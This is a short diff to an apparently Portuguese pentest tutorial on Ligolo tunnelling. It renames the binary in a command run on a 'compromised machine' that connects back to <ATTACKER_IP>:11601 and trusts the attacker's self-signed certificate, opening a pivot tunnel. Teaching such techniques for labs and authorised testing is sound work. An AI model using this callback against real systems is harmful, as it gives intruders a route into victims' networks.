@@ -140,7 +140,7 @@ O server precisa ser iniciado com sudo porque o ligolo criar interface de rede e
 
 > <strong>2 - inicie o client na maquina comprometida</strong>
 
-```$ ./client -connect <ATTACKER_IP>:11601 --accept-fingerprint <SERVER_FINGERPRINT>```
+```$ ./agent -connect <ATTACKER_IP>:11601 --accept-fingerprint <SERVER_FINGERPRINT>```
 
 Usando o ip da maquina do atacante e a porta padrão que o server usa ao inicar, junto com o fingerprint do server pra usar o certificado TLS self-signed que o server gera.
 
